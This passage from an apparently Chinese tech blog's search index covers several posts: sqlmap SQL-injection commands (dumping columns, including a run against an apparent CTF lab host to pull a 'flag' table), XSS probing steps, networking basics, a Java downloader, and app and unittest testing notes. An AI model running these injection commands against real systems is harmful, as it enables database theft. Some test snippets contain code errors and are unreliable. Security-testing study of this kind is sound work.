定数据库名表名字段dump出指定字段 sqlmap -u “http://ooxx.com/a.php?id=1“ -D dbsname -T tablename -C columnname —dump cookie 注入 —cookie=COOKIE 在需要登录的地方，需要登录后的cookie 执行指定的 SQL 语句 —sql-query=QUERY 代理注入 —proxy=”http://127.0.0.1:8087“ 命令1python sqlmap.py -u \"https://rimovni.exeye.run/hugkudure/well\" --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump —form :表单 —batch :跳过选择 开始注入，获得数据库","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://kayleh.top/tags/security/"}]},{"title":"Front end security","slug":"前端安全","date":"2021-04-04T07:56:49.000Z","updated":"2021-04-11T17:11:28.754Z","comments":true,"path":"Front-end-security/","link":"","permalink":"https://kayleh.top/Front-end-security/","excerpt":"","text":"前端安全 xss跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻击手段是在在利用网站上的可由用户输入信息的地方，恶意注入含有攻击性的脚本，达到攻击网站或者窃取用户cookied等隐私信息的目的。 XSS漏洞测设流程：第一步：在目标站点上找到输入点，比如查询接口，留言板等；第二步：输入一组“特殊字符+唯一识别字符”，点击提交，查看返回的源码，是否有做对应的处理；第三步：通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构成执行js的条件（构造闭合）第四步：提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执则说明存在XSS漏洞 Html5存储","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://kayleh.top/tags/security/"}]},{"title":"What happened from entering the URL to displaying the page?","slug":"从输入URL到显示页面经历了什么","date":"2021-03-30T09:22:51.000Z","updated":"2021-04-15T15:10:07.693Z","comments":true,"path":"What-happened-from-entering-the-URL-to-displaying-the-page/","link":"","permalink":"https://kayleh.top/What-happened-from-entering-the-URL-to-displaying-the-page/","excerpt":"","text":"从输入URL到显示页面经历了什么? 这个过程可以大致分为两个部分：网络通信和页面渲染。 一、网络通信 互联网内各网络设备间的通信都遵循TCP/IP协议，利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。分层由高到低分别为：应用层、传输层、网络层、数据链路层。发送端从应用层往下走，接收端从数据链路层网上走。如图所示： 1. 在浏览器中输入url 用户输入url，例如http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。 2.应用层DNS解析域名 客户端先检查本地是否有对应的IP地址，若找到则返回响应的IP地址。若没找到则请求上级DNS服务器，直至找到或到根节点。 DNS中递归查询和迭代查询的区别 1、 递归查询： 一般客户机和服务器之间属递归查询，即当客户机向DNS服务器发出请求后，若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到结果后转交客户机。 2、 迭代查询（反复查询）： 一般DNS服务器之间属迭代查询，如：若DNS2不能响应DNS1的请求，则它会将DNS3的IP给DNS2，以便其再向DNS3发出请求。 以一个DNS请求解析为例： 1）用户发起域名请求到dnsA，这时dnsA有这个记录，将结果返回给用户，这个过程是递归查询。 2）用户发起域名请求到dnsA，这时dns没有这个记录，它去向dnsB问有没有这个记录，以此类推，直到把结果返回给用户，这个过程是递归查询。 3）用户发起域名请求到dnsA，这时dnsA没有这个记录，它告诉用户，我没有这个记录，你去问dnsB吧，这个过程是迭代查询。 3.应用层客户端发送HTTP请求 HTTP请求包括请求报头和请求主体两个部分，其中请求报头包含了至关重要的信息，包括请求的方法（GET / POST）、目标url、遵循的协议（http / https / ftp…），返回的信息是否需要缓存，以及客户端是否发送cookie等。 4.传输层TCP传输报文位于传输层的TCP协议为传输报文提供可靠的字节流服务。它为了方便传输，将大块的数据分割成以报文段为单位的数据包进行管理，并为它们编号，方便服务器接收时能准确地还原报文信息。TCP协议通过“三次握手”等方法保证传输的安全可靠。 “三次握手”的过程是，发送端先发送一个带有SYN（synchronize）标志的数据包给接收端，在一定的延迟时间内等待接收的回复。接收端收到数据包后，传回一个带有SYN/ACK标志的数据包以示传达确认信息。接收方收到后再发送一个带有ACK标志的数据包给接收端以示握手成功。在这个过程中，如果发送端在规定延迟时间内没有收到回复则默认接收方没有收到请求，而再次发送，直到收到回复为止。 5.网络层IP协议查询MAC地址IP协议的作用是把TCP分割好的各种数据包传送给接收方。而要保证确实能传到接收方还需要接收方的MAC地址，也就是物理地址。IP地址和MAC地址是一一对应的关系，一个网络设备的IP地址可以更换，但是MAC地址一般是固定不变的。ARP协议可以将IP地址解析成对应的MAC地址。当通信的双方不在同一个局域网时，需要多次中转才能到达最终的目标，在中转的过程中需要通过下一个中转站的MAC地址来搜索下一个中转目标。 6.数据到达数据链路层在找到对方的MAC地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束 7.服务器接收数据接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过TCP协议讲分段的数据包重新组成原来的HTTP请求报文。 8.服务器响应请求服务接收到客户端发送的HTTP请求后，查找客户端请求的资源，并返回响应报文，响应报文中包括一个重要的信息——状态码。状态码由三位数字组成，其中比较常见的是200 OK表示请求成功。301表示永久重定向，即请求的资源已经永久转移到新的位置。在返回301状态码的同时，响应报文也会附带重定向的url，客户端接收到后将http请求的url做相应的改变再重新发送。404 not found 表示客户端请求的资源找不到。 9. 服务器返回相应文件请求成功后，服务器会返回相应的HTML文件。接下来就到了页面的渲染阶段了。 二、页面渲染现代浏览器渲染页面的过程是这样的：解析HTML以构建DOM树 –&gt; 构建渲染树 –&gt; 布局渲染树 –&gt; 绘制渲染树。 DOM树是由HTML文件中的标签排列组成，渲染树是在DOM树中加入CSS或HTML中的style样式而形成。渲染树只包含需要显示在页面中的DOM元素，像&lt;head&gt;元素或display属性值为none的元素都不在渲染树中。 在浏览器还没接收到完整的HTML文件时，它就开始渲染页面了，在遇到外部链入的脚本标签或样式标签或图片时，会再次发送HTTP请求重复上述的步骤。在收到CSS文件后会对已经渲染的页面重新渲染，加入它们应有的样式，图片文件加载完立刻显示在相应位置。在这一过程中可能会触发页面的重绘或重排。","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"Download","slug":"DOWNLOAD","date":"2021-03-15T09:18:07.000Z","updated":"2021-04-15T15:26:11.540Z","comments":true,"path":"Download/","link":"","permalink":"https://kayleh.top/Download/","excerpt":"","text":"Java 多线程下载器的设计与实现应用并发的场景有很多，下载文件就是一个很常见的并发场景。 为什么会想写多线程下载器呢？不知道你用过 IDM（Internet Download Manager）没，我刚使用 IDM 时，就被它的下载方式吸引了。 用 IDM 下载文件时，能够直观地看到它的下载过程：固定用 N 个线程下载文件，一开始先将文件分为 N 段，每段用一个线程下载，当某一段下载完成之后，对应的线程就空闲了，此时怎么做呢？从剩余的 N - 1 段中取出最大的一段，一分为二，这样就又有了 N 段的数据，让空闲的线程去下载新划分出来的这一段。 每当有一个线程完成下载任务时，就不断从剩余的部分中划分出一段给它下载，直到整个文件的所有部分都下载完毕。 当然，文件并不能被无限地分段，IDM 会设定一个段的阈值，当剩余的最大段小于这个阈值的时候，就不再分段了给空闲的线程了，只等待活动中的所有线程下载完毕。 说完 IDM 的下载策略，我们大致有了思路。不过优秀的软件不是一蹴而就的，虽然我们想写出像 IDM 的下载器，但还需要从简单的实现开始，不断迭代优化。 所以我们一开始采用的策略是：固定 N 个线程，并将文件划分为 N 段，每个线程负责下载一段数据。 实现步骤判断服务器是否支持断点续传 首先要明确的是，多线程下载文件利用的是每个线程下载文件的一部分，那么就需要 HTTP 服务器支持请求部分数据，或者说断点续传，因此第一步需要判断目标文件是否支持断点续传。 HTTP 请求头中有一个 Range 字段，可以用来指定要请求的数据范围，例如我们要请求从第 10 字节到第 20 字节的数据，可以将该字段写为 Range:bytes=10-20。 相应的，如果 HTTP 服务器支持断点续传，那么对于指定了 Range 字段的请求，会返回 206 状态码。 我们用 Curl 来测试一下： 1curl -I --header \"Range: bytes=0-\" http://mirrors.163.com/debian/ls-lR.gz 得到的响应： 123456789HTTP&#x2F;1.1 206 Partial ContentServer: nginxDate: Wed, 25 Apr 2018 02:57:56 GMTContent-Type: application&#x2F;octet-streamContent-Length: 15316619Connection: keep-aliveLast-Modified: Mon, 23 Apr 2018 14:38:44 GMTETag: &quot;5addeff4-e9b68b&quot;Content-Range: bytes 0-15316618&#x2F;15316619 我们设置 Range: bytes=0- ，表示请求从第 0 字节到最后一字节的数据，那为什么还要指定该字段呢？这是出于两方面的原因：一是判断响应的状态码是否为 206，二是得到文件的大小。 如果服务器支持断点续传，那么我们采用多线程进行下载，如果不支持断点续传，就采用单线程下载。 文件分段 我们得到了文件的大小 fileSize，将其分为 N 段，则每一段的大小为 fileSize / N，由于文件通常不会正好被分为 N 段，因此最后一段就等于剩余的部分的大小。 我们用一个数组 endPoint 来存放每一段的起止位置，例如一个 10 B 的文件，起止范围是 0~9，如果分为 3 段下载，那么 endPoint = {0, 3, 6, 10}，对每段来说是左闭右开区间。 解释：对于第 i 段（i 从 0 开始）来说，从 endPoint[i] 开始下载，在 endPoint[i + 1] - 1 处停止。同理，对第 i + 1 段来说，从 endPoint[i + 1] 开始，在 endPoint[i + 2] - 1 处停止。 创建下载线程 我们为每一段创建一个下载线程进行下载，每一段都存放在一个单独的临时文件中。 下载线程需要做的事情可以总结如下： 设置请求头的 Range 字段来指定请求范围 设置超时时间 连接 HTTP 服务器 创建临时文件（第一次下载该段） 读取服务器返回的数据，写入到临时文件，直到读取的字节数等于该段的大小 关闭临时文件 上面是顺利下载的流程，我们还需要在出现下列问题时进行重试： 如果连接时间或读取时间超时 临时文件读写出错 这样又有问题了，对于该线程来说，重试时是重新下载整段，还是接着下载剩余部分？我们知道，最好就是接着下载还没下完的那部分，那如何实现呢？ 我们可以这么做：每个线程保存自己负责部分的起止位置，在刚启动线程时，起止位置就是段的起止位置，创建临时文件写出已下载的数据。在下载数据时，实时更新线程的起始位置为当前已下载字节的下一个字节，当出错需要重试时，直接从该位置开始，并且写出到之前创建的临时文件中。 创建监视线程 我们创建一个守护线程，负责监视文件的下载进度、下载速度、当前活跃线程数，在各线程下载结束后，通知主线程做下一步处理。 处理临时文件 当主线程收到通知，所有部分都下载完成时，就需要对临时文件进行清理。 如果是多线程下载的文件，那么需要对多个临时文件进行合并。 如果是单线程下载的文件，则对临时文件进行重命名。 具体实现这里给出程序的轮廓，进行整体上的介绍，完整的源码可查看 Github：https://github.com/wrayzheng/java-multithread-downloader 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class HttpDownloader &#123; private boolean resumable; private URL url; private File localFile; private int[] endPoint; private Object waiting = new Object(); private AtomicInteger downloadedBytes = new AtomicInteger(0); private AtomicInteger aliveThreads = new AtomicInteger(0); private boolean multithreaded = true; private int fileSize = 0; private int THREAD_NUM = 5; private int TIME_OUT = 5000; private final int MIN_SIZE = 2 &lt;&lt; 20; public HttpDownloader(String Url, String localPath) throws MalformedURLException &#123;...&#125; public HttpDownloader(String Url, String localPath, int threadNum, int timeout) throws MalformedURLException &#123;...&#125; //开始下载文件 public void get() throws IOException &#123;...&#125; //检测目标文件是否支持断点续传，以决定是否开启多线程下载文件的不同部分 public boolean supportResumeDownload() throws IOException &#123;...&#125; //监测下载速度及下载状态，下载完成时通知主线程 public void startDownloadMonitor() &#123;...&#125; //对临时文件进行合并或重命名 public void cleanTempFile() throws IOException &#123;...&#125; //合并多线程下载产生的多个临时文件 public void merge() &#123;...&#125; //一个下载线程负责下载文件的某一部分，如果失败则自动重试，直到下载完成 class DownloadThread extends Thread &#123; private int id; private int start; private int end; private OutputStream out; public DownloadThread(int id, int start, int end) &#123;...&#125; //保证文件的该部分数据下载完成 @Override public void run() &#123;...&#125; //下载文件指定范围的部分 public boolean download() &#123;...&#125; &#125;&#125; 这里将 DownloadThread 定义为 HttpDownloader 的内部类，这是因为一个 HttpDownloader 实例对应一个文件下载任务，该实例中存放了该任务的各种数据，而下载线程是与该任务是关联的，需要用到这些数据，因此定义为内部类可以直接共享这些数据，从而避免过多的参数传递和存储。 要下载一个文件，首先创建一个 HttpDownloader 实例，必须传入的参数是目标文件 URL 和本地的存储位置，可选参数是线程数和超时时间。 HttpDownloader 的入口方法为 get()，它的工作如下： 调用 supportResumeDownload() 方法判断目标文件是否支持断点续传以及是否大于设定的文件最小值，以决定是否采取多线程的下载方式； 计算每一段的起止位置，存入 endPoint； 创建 DownloadThread 线程进行下载； 调用 startDownloadMonitor() 方法启动监视线程； 等待文件下载完毕； 调用 cleanTempFile() 处理临时文件； 输出结束信息。 再来介绍一下 DownloadThread，它的入口方法是 run()，工作如下： 调用 download() 方法下载指定部分的数据; 如果成功，则线程结束，如果失败，则回到上一步。 下载测试对于单个连接限速的服务器，多线程下载才能体现其优势，如果服务器本身不对连接限速，那么单个连接也能接近带宽上限。 我们来看看，对于单个连接速度远小于带宽时，单线程与多线程的对比。 首先是单个线程进行下载： 用时 54.133 秒，平均下载速度 42 KB/s。 开启 10 个线程进行下载： 用时 10.144 秒，平均下载速度 228 KB/s。 可以看到，相比单线程下载，开启多线程之后下载速度有了巨大的提升。 在实际下载时，根据网络状况不同，设置不同的超时时间，对下载速度也有不小的影响。如果超时时间设置过小，会导致线程频繁建立连接，而建立连接是相对耗时的操作，导致下载效率低下；如果超时时间设置过长，可能连接已经失效，而客户端却长时间等待，无谓地消耗时间。 结语这是一个最基本的多线程下载器的实现，将文件划分为固定的 N 段，分配给 N 个线程下载，当一个线程下载完成后，该线程就随之结束了，没有被再次利用。 之后我会对该程序做进一步的优化，一方面会采取和 IDM 类似的下载策略，进一步提高下载效率，另一方面，也会在功能和鲁棒性方面进行加强，完善异常处理。","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"app test","slug":"app-test","date":"2021-03-03T08:49:54.000Z","updated":"2021-04-11T17:11:28.482Z","comments":true,"path":"app-test/","link":"","permalink":"https://kayleh.top/app-test/","excerpt":"","text":"移动端测试要点安装测试、卸载测试UI测试 功能测试 运行app 应用的前后台切换 免登陆 数据更新 离线浏览 app更新 定位、照相机服务 时间测试 PUSH测试 性能测试 交叉事件测试 例如：微信视频和来电 兼容性测试升级、更新测试 用户体验测试 硬件环境测试 接口测试客户端数据库测试 安全测试 Android测试Android系统的基本结构 linux内核层 Android函数库和Android运行的虚拟机 应用程序框架 应用程序 测试术语 系 统碎片化 屏幕尺寸 分辨率 像素 网络制式 像素一位=8字节 大小 1156*634 = 732904 732904/8=9291613=92K 9291613/1024=89. 网络制式 Android四大组件 缺一不可 活动 服务 内容提供者 广播接受者 Android测试环境搭建:one:真机测试使用真实的手机测试 :two:安卓模拟器:three:Android自带的模拟器:four:云真机测试Android开发环境 安装java, jdk ADT工具包 环境配置 打开eclipse ADB命令 启动和关闭服务 adb kill-server adb start server adb.exe connect 127.0.0.1:62001 查看设备连接情况 安装和卸载APK程序 列出当前设备上的程序包 adb shell pm list packages 上传和下载 日志 过滤 其他 adb bugreport monkey命令是什么？ 所有的操作事件都是随机发生的。不以让人的意志为变化。 由于事件都是随机的、无序的，所以不做功能方面的测试，只对APP进行性能、稳定性方面的测试。 monkey测试的时候，需要长时间、大量的操作事件 特征 Monkey的停止条件 进入Monkey 命令 使用案例 —pct monkey命令的参数,没有特别强制性的顺序,可以按照monkey命令的帮助列表的参数顺序记忆和使用. Monkey异常log分析 Appium https://github.com/appium/appium-desktop/releases/tag/v1.20.2 元素识别 使用ADT环境中的sdk目录下,tools目录中的uiautomatorviewer.bat 启动uiautomatorviewer.bat 点击device Screenshot 操作 模拟键盘手机操作 输入操作: sendkeys() 点击操作: click() 模拟手势操作 移动设备相关操作 Appium脚本编写1234567891011121314151617181920212223242526272829303132public class TestAppium&#123; public static main(String[] args) throws Exception&#123; //定义DesiredCapabilities对象 DesiredCapabilities dc = new DesiredCapabilities(); //设定DesiredCapabilities的属性 dc.setCapability(\"deviceName\",\"127.0.0.1:56001\");//adb命令查出的设备的编号 dc.setCapability(\"automationName\",\"Appium\");//设置自动化测试工具名称 dc.setCapability(\"platformName\",\"Android\");//设置平台系统名称 dc.setCapability(\"platformVersion\",\"4.4.4\");//设置Android系统版本号 dc.setCapability(\"appPackage\",\"com.youba.calculate\");//设置目标app包名 dc.setCapability(\"appActivity\",\".MainActivity\");//设置目标app的启动界面 /** * url:指的是本地appium服务的IP地址及对应的端口号(appium的默认端口号是4723) * 通过该地址可以使appium连接Android设备 * * Capabilities:就是DesiredCapabilities对象 **/ //定义appium驱动对象 打开本地app驱动(appium) AppiumDriver appd = new AppiumDriver(new URL(\"http://127.0.0.1/wd/hub\"),dc); //写脚本,让计算器计算54+68 appd.findElement(By.id(\"com.youba.calculate:id/btn_five\")).click(); appd.findElement(By.id(\"com.youba.calculate:id/btn_four\")).click(); appd.findElement(By.id(\"com.youba.calculate:id/btn_plus\")).click(); appd.findElement(By.id(\"com.youba.calculate:id/btn_six\")).click(); appd.findElement(By.id(\"com.youba.calculate:id/btn_eight\")).click(); appd.findElement(By.id(\"com.youba.calculate:id/btn_equal\")).click(); appd.closeApp(); &#125;&#125; Junit一次单元测试用例设计的过程 Junit环境 编写测试在这里你将会看到一个应用 POJO 类，Business logic 类和在 test runner 中运行的 test 类的 JUnit 测试的例子。 在 C:\\ &gt; JUNIT_WORKSPACE 路径下创建一个名为 EmployeeDetails.java 的 POJO 类。 12345678910111213141516171819202122232425262728293031323334353637383940414243public class EmployeeDetails &#123; private String name; private double monthlySalary; private int age; /** * @return the name */ public String getName() &#123; return name; &#125; /** * @param name the name to set */ public void setName(String name) &#123; this.name = name; &#125; /** * @return the monthlySalary */ public double getMonthlySalary() &#123; return monthlySalary; &#125; /** * @param monthlySalary the monthlySalary to set */ public void setMonthlySalary(double monthlySalary) &#123; this.monthlySalary = monthlySalary; &#125; /** * @return the age */ public int getAge() &#123; return age; &#125; /** * @param age the age to set */ public void setAge(int age) &#123; this.age = age; &#125;&#125; EmployeeDetails 类被用于 取得或者设置雇员的姓名的值 取得或者设置雇员的每月薪水的值 取得或者设置雇员的年龄的值 在 C:\\ &gt; JUNIT_WORKSPACE 路径下创建一个名为 EmpBusinessLogic.java 的 business logic 类 12345678910111213141516171819public class EmpBusinessLogic &#123; // Calculate the yearly salary of employee public double calculateYearlySalary(EmployeeDetails employeeDetails)&#123; double yearlySalary=0; yearlySalary = employeeDetails.getMonthlySalary() * 12; return yearlySalary; &#125; // Calculate the appraisal amount of employee public double calculateAppraisal(EmployeeDetails employeeDetails)&#123; double appraisal=0; if(employeeDetails.getMonthlySalary() &lt; 10000)&#123; appraisal = 500; &#125;else&#123; appraisal = 1000; &#125; return appraisal; &#125;&#125; EmpBusinessLogic 类被用来计算 雇员每年的薪水 雇员的评估金额 在 C:\\ &gt; JUNIT_WORKSPACE 路径下创建一个名为 TestEmployeeDetails.java 的准备被测试的测试案例类 123456789101112131415161718192021222324252627import org.junit.Test;import static org.junit.Assert.assertEquals;public class TestEmployeeDetails &#123; EmpBusinessLogic empBusinessLogic =new EmpBusinessLogic(); EmployeeDetails employee = new EmployeeDetails(); //test to check appraisal @Test public void testCalculateAppriasal() &#123; employee.setName(\"Rajeev\"); employee.setAge(25); employee.setMonthlySalary(8000); double appraisal= empBusinessLogic.calculateAppraisal(employee); assertEquals(500, appraisal, 0.0); &#125; // test to check yearly salary @Test public void testCalculateYearlySalary() &#123; employee.setName(\"Rajeev\"); employee.setAge(25); employee.setMonthlySalary(8000); double salary= empBusinessLogic.calculateYearlySalary(employee); assertEquals(96000, salary, 0.0); &#125;&#125; TestEmployeeDetails 是用来测试 EmpBusinessLogic 类的方法的，它 测试雇员的每年的薪水 测试雇员的评估金额 现在让我们在 C:\\ &gt; JUNIT_WORKSPACE 路径下创建一个名为 TestRunner.java 的类来执行测试案例类 12345678910111213import org.junit.runner.JUnitCore;import org.junit.runner.Result;import org.junit.runner.notification.Failure;public class TestRunner &#123; public static void main(String[] args) &#123; Result result = JUnitCore.runClasses(TestEmployeeDetails.class); for (Failure failure : result.getFailures()) &#123; System.out.println(failure.toString()); &#125; System.out.println(result.wasSuccessful()); &#125;&#125; 用javac编译 Test case 和 Test Runner 类 12C:\\JUNIT_WORKSPACE&gt;javac EmployeeDetails.java EmpBusinessLogic.java TestEmployeeDetails.java TestRunner.java 现在运行将会运行 Test Case 类中定义和提供的测试案例的 Test Runner 1C:\\JUNIT_WORKSPACE&gt;java TestRunner 检查运行结果 1true","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"interface test","slug":"Interface-test","date":"2021-02-20T09:49:12.000Z","updated":"2021-04-11T17:11:28.165Z","comments":true,"path":"interface-test/","link":"","permalink":"https://kayleh.top/interface-test/","excerpt":"","text":"接口测试 测试系统内部各个组件间接口,以及系统与外部系统之间的交互点 接口的必要条件 接口用例设计 HTTP协议 HTTP响应状态码分类 POSTMAN发送不带参数的GET请求 发送带参数的GET请求 参数化运行 csv文件 JSONPostman中的断言 450","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"Unitest framework","slug":"Unitest-framework","date":"2021-02-12T08:00:57.000Z","updated":"2021-04-11T17:11:28.470Z","comments":true,"path":"Unitest-framework/","link":"","permalink":"https://kayleh.top/Unitest-framework/","excerpt":"","text":"多条测试用例 注解方法 五个方法 测试用例testcase 测试集合testsuite追加单个测试对象 print(re.__dict__) 追加多个测试对象 TestLoder 第一个参数path：指定存放测试用例的目录（单元测试用例，用unittest框架写的测试用例） 第二个参数pattern：指定匹配规则 TestRunner 状态1 状态2（大于1即可）详细报告 断言 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class mymath(): def jia(self,a,b): return a+b; def jian(self,a,b): return a-b def changfa(self,a,b): if b==0: return \"error\" else: return a/b#代码功能验证if __name__==\"__main__\": mm = mymath() actualValue = m.jia(2,3) expectValue = 5 if actualValue==expectValue: print(\"加法功能实现正确\") try: actualValue==mm.jia(\"a\",3) except Exception as e: print(\"该方法功能实现正确\"，e)-----------------------------------------------------------#导包import unittestfrom myMath import mymath#创建单元测试类(继承自unittest.testcase)class myMathTest(unittest.TestCase): #测试用例资源初始化方法 def setUp(self): self.mm = mymath() #测试用例方法 def test_add_1(self): actualValue = self.mm.jia(2,1) expectValue = 3 #断言 self.assertEqual(actualValue,expectValue,\"预期结果不一致\") def test_add_2(self): actualValue = self.mm.jia(\"abc\",\"def\") expectValue = \"abcdef\" self.assertEqual(actualValue,expectValue,\"预期结果不一致\") def test_floor_1(self): actualValue = self.mm.chufa(4,0) expectValue = \"abcdef\" self.assertEqual(actualValue,expectValue,\"预期结果不一致\") #测试用例的资源释放 def tearDown(self): passif __name__==\"__main__\": #unittest.main() #直接使用discover discover=unittest.defaultTestLoader.discover(r\"./20200408/\",pattern=\"myMathTest.py\") #使用runner运行器运行测试集 \"a\"追加模式 with open(r\"./20200408/re.txt\",\"a\",encoding=\"utf-8\") as f: runner=unittest.TextTestRunner(f,description=\"用于测试math类的用例执行\",verbosity=2) runner.run(discover) maintest.py 主测试文件,不是用来写测试用的,而是用来组织测试用来执行的 HTML测试文档HTMLTestRunner模块安装HTMLTestRunner.py到python的安装目录下/lib中 1pip install html-TestRunner 使用1234567891011import osfrom HTMLTestRunner import HTMLTestRunner#path=os.path.dirname(__file__)当前目录path=os.path.dirname(__file__)+r\"/\"filename=time.strname(\"%Y-%m-%d-%H-%M-%S\") + r\".html\"filename = path + filename#修改代码with open(r\"./20200408/result.html\",\"wb\") as f: runner=unittest.HTMLTestRunner(f,verbosity=2,title=\"单元测试报告\",description=\"第一次运行的结果\") runner.run(discover) 注释 邮件自动化 项目项目目录结构 1234---public(模块,例如注册,登录,退出)---test_cases(测试用例)---test_datas(测试数据,例如csv文件)---test_report(测试报告) 电商系统/public/loginModule.py 登录模块 12345678910111213141516171819202122232425262728293031from selenium import webdriverfrom selenium.webdriver.common.action_chains import ActionChainsimport timeclass very_login(): def login(self,driver): self.driver=driver self.driver.implicitly_wait(10) self.driver.get(\"http://localhost/verydows/\") #点击登录 self.driver.find_element_by_link_text(\"登录\").click() #输入用户名密码 self.driver.find_element_by_xpath('//*[@id=\"username\"]').send_keys(\"kayleh\") self.driver.find_element_by_xpath('//*[@id=\"password\"]').send_keys(\"123456\") #点击登录按钮 self.driver.find_element_by_xpath('//*[@id=\"login-form\"]/div/a').click() time.sleep(5) #退出登录 def logout(self,driver): self.driver=driver ele=self.driver.find_element_by_xpath('//*[@id=\"top-userbar\"]/a') ActionChains(self.driver).move_to_element(ele).perform() self.driver.find_element_by_link_text(\"退出\").click() #退出浏览器对象 def quitB(self,driver): self.driver=driver self.driver.quit() if __name__==\"__main__\": driver=webdriver.Chrome() 电商系统/testcases/verydows_user_update.py 更新用户信息 123456789101112131415161718192021222324252627282930313233343536373839import unittestfrom selenium import webdriverimport timeimport osimport sys#os.path.dirname(os.path.dirname(__file__))是这个文件的目录的上一级目录(电商系统)path=os.path.dirname(os.path.dirname(__file__))+r\"/public\"#添加到环境变量path1=sys.pathpath1.append(path)from loginModule import very_loginclass verydows_user_update(unittest.TestCase): def setUp(self): self.ll = very_login() self.driver=webdriver.Chrome() self.ll.login(self.driver) def test_user_01(self): time.sleep(3) self.driver.find_element_by_xpath('').click() time.sleep(2) self.driver.find_element_by_xpath('').clear() time.sleep(2) self.driver.find_element_by_xpath('').send_keys(\"petter\") time.sleep(2) self.driver.find_element_by_xpath('').clear() time.sleep(5) #修改完验证 def tearDown(self): self.ll.logout(self.driver) self.ll.quitB(self.driver) actualValue=self.driver.find_element_by_xpath('').get_attribute(\"value\") expectValue=\"peter\" self.assertEqual(actualValue,expectValue)if __name__==\"__main__\": unittest.main() 电商系统/testcases/verydows_reg_true.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import unittestfrom selenium import webdriverimport timeimport csvimport osfilename = os.path.dirname(os.path.dirname(__file__))+r\"/test_datas/data_csv.csv\"class verydows_reg_true(unittest.TestCase): def setUp(self): pass def test_reg_01(self): with open(filename,\"r\",encoding=\"utf-8\") as f: data=csv.reader(f) for d in data: driver.get(\"http://localhost/verydows/\") driver.find_element_by_link_text(\"免费注册\").click() driver.find_element_by_id(\"username\").send_keys(d[0]) driver.find_element_by_id(\"email\").send_keys(d[1]) driver.find_element_by_id(\"password\").send_keys(d[2]) driver.find_element_by_id(\"repassword\").send_keys(d[3]) driver.find_element_by_link_text(\"立即注册\").click() #因为有一个中间页面的跳转，此处要强制等待一下，让他跳转过去 time.sleep(2) #断言 #expectUrl=\"http://localhost/verydows/index.php?c=user&amp;a=index\" #actualUrl=driver.current_url expectValue=d[4] actualValue=driver.find_element_by_xpath('//....').text() #if expectValue==actualValue: # print(\"注册username反向测试用例通过\") #else: # print(\"注册username反向用例不通过\") self.assertEqual(expectValue,actualValue) #关闭浏览器对象 driver.quit() def tearDown(self): pass if __name__==\"__main__\": unittest.main() 电商系统/maintest.py 123456789101112131415#在此文件中调度测试用例执行import unittestfrom HTMLTestRunner import HTMLTestRunnerimport osimport time pathCase=os.path.dirname(__file__)+r\"/test_cases/\"pathReport=os.path.dirname(__file__)+r\"/test_cases/\"filename=time.strname(\"%Y-%m-%d-%H-%M-%S\") + r\".html\"filename=pathReport+filenamediscover = unittest.defaultTestLoader.discover(path,pattern=r\"verydows*.py\") with open(filename,\"wb\") as f: runner=unittest.HTMLTestRunner(f,verbosity=2,title=\"自动化测试用例报告\",description=\"XX\") runner.run(discover) Unittest下的数据驱动测试数据存储 测试脚本与测试数据分离 不导入ddt模块，字典只会形成一条测试用例 excel xldr excelutil.py","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"Katalon Recorder (Selenium tests generator)","slug":"katalon","date":"2021-02-01T10:42:57.000Z","updated":"2021-04-11T17:11:28.506Z","comments":true,"path":"automated-test-katalon/","link":"","permalink":"https://kayleh.top/automated-test-katalon/","excerpt":"","text":"和Selenium IDE类似的工具 Katalon Recorder (Selenium tests generator)","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"Dynamic programming动态规划","slug":"动态规划","date":"2021-01-31T10:54:04.000Z","updated":"2021-04-11T17:11:28.769Z","comments":true,"path":"dynamic-programming/","link":"","permalink":"https://kayleh.top/dynamic-programming/","excerpt":"","text":"动态规划 首先，动态规划问题的一般形式就是求最值。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求最长递增子序列呀，最小编辑距离呀等等。 既然是要求最值，核心问题是什么呢？求解动态规划的核心问题是穷举。因为要求最值，肯定要把所有可行的答案穷举出来，然后在其中找最值呗。 动态规划这么简单，就是穷举就完事了？我看到的动态规划问题都很难啊！ 首先，动态规划的穷举有点特别，因为这类问题存在「重叠子问题」，如果暴力穷举的话效率会极其低下，所以需要「备忘录」或者「DP table」来优化穷举过程，避免不必要的计算。 而且，动态规划问题一定会具备「最优子结构」，才能通过子问题的最值得到原问题的最值。 另外，虽然动态规划的核心思想就是穷举求最值，但是问题可以千变万化，穷举所有可行解其实并不是一件容易的事，只有列出正确的「状态转移方程」才能正确地穷举。 以上提到的重叠子问题、最优子结构、状态转移方程就是动态规划三要素。具体什么意思等会会举例详解，但是在实际的算法问题中，写出状态转移方程是最困难的，这也就是为什么很多朋友觉得动态规划问题困难的原因，我来提供我研究出来的一个思维框架，辅助你思考状态转移方程： 明确 base case -&gt; 明确「状态」-&gt; 明确「选择」 -&gt; 定义 dp 数组/函数的含义。 按上面的套路走，最后的结果就可以套这个框架： 1234567# 初始化 base casedp[0][0][...] = base# 进行状态转移for 状态1 in 状态1的所有取值： for 状态2 in 